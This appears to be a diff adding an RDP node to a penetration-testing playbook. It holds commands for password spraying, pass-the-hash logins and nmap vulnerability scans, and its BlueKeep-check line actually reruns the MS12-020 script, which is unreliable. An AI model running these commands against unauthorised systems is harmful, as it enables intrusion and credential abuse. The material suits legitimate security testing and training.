@@ -1,0 +1,22 @@
+{
+  "id": "rdp",
+  "phase": "WINDOWS",
+  "title": "RDP (3389)",
+  "body": "RDP is everywhere on Windows targets. xfreerdp from Kali, pass-the-hash via restricted admin mode, credential spray. Always try creds you already have.",
+  "cmd": "xfreerdp /u:user /p:'password' /v:$ip /cert-ignore\nxfreerdp /u:administrator /pth:NTLM_HASH /v:$ip /cert-ignore +clipboard\n\ncrackmapexec rdp $ip -u users.txt -p passwords.txt\ncrackmapexec rdp $ip -u administrator -H NTLM_HASH\n\nnmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $ip\n\n# BlueKeep check (CVE-2019-0708) — DO NOT auto-exploit, can crash target\nnmap -p 3389 --script rdp-vuln-ms12-020 $ip",
+  "warn": "Pass-the-hash via RDP requires restricted admin mode to be enabled on the target.",
+  "choices": [
+    {
+      "label": "Got RDP access — Windows foothold",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Need creds first",
+      "next": "bruteforce"
+    },
+    {
+      "label": "BlueKeep vulnerable — searchsploit",
+      "next": "searchsploit_web"
+    }
+  ]
+}
